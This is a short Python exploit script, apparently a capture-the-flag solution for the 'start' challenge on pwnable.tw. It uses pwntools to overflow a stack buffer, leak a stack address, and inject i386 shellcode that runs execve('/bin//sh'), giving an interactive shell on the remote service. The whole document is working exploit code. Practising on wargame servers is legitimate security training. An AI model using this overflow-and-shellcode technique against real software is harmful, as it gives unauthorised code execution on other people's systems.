from pwn import *

#p = process('./start')
p = remote("chall.pwnable.tw", 10000)
context.arch = 'i386'
shellcode = asm('''
push 0xb
pop eax
xor ecx, ecx
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
''')
p.sendafter(b"Let's start the CTF:", b"A"*0x14 + p32(0x8048087))
stack = u32(p.recvn(4))
log.success(f"stack address : {hex(stack)}")
payload = b"A" * 0x14 + p32(stack + 0x14) + shellcode
p.send(payload)
p.interactive()